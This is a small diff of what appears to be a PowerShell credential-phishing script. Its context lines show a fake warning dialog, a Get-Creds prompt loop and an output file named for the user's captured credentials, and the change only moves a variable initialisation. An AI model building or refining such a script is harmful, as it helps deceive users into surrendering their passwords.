@@ -53,7 +53,7 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 function Get-Creds {
 
-    $form = $null
+    
 
     while ($form -eq $null)
     {
@@ -139,7 +139,7 @@ $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
 Write-Host "The user clicked: $Result"
-
+$form = $null
 $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
